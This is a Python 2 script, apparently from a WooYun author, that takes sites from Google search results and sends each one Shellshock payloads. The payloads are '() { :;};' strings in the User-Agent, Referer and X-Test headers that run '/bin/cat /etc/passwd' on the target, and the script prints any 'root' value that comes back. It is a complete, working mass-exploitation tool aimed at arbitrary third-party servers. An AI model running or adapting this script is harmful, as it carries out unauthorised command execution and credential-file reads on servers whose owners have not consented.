#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# writted by brock@wooyun

import urllib2
import sys
import getopt
from utils import google
from utils import webutils
import time

resultCount = 20
beginNumber = 0
waitTime = 0.0

def testBashShock1(url):
	opener = urllib2.build_opener()
	webutils.setupOpener(opener)
	req = urllib2.Request(url)
	req.add_header('Proxy-Connection', 'keep-alive')
	req.add_header('Cache-Control', 'max-age=0')
	req.add_header('X-Test', '() { :;};a=`/bin/cat /etc/passwd`;echo $a')
	req.add_header('User-Agent', '() { :;};a=`/bin/cat /etc/passwd`;echo $a')
	req.add_header('Referer', '() { :;};a=`/bin/cat /etc/passwd`;echo $a')

	print '******* ' + url + ' *******'
	try:
		response = opener.open(req)
		if response:
			if response.info().getheader('root'):
				print 'root:' + response.info().getheader('root')
			#for k, v in response.info().items():
			#	print k + ': ', v
	except Exception, e:
	   print 'Exception: ', e


opts, args = getopt.getopt(sys.argv[1:], "n:b:w:")
for op, value in opts:
	if op == '-n':
		resultCount = int(value)
	elif op == '-b':
		beginNumber = int(value)
	elif op == '-w':
		waitTime = int(value)

opener = urllib2.build_opener()
webutils.setupOpener(opener)

#print resultCount
#print args[0]
i = 0
#import pdb
#pdb.set_trace()
for url in google.google(opener, args[0], resultCount, beginNumber):
	i += 1
	testBashShock1(url)
	if waitTime > 0:
		time.sleep(waitTime)

print i

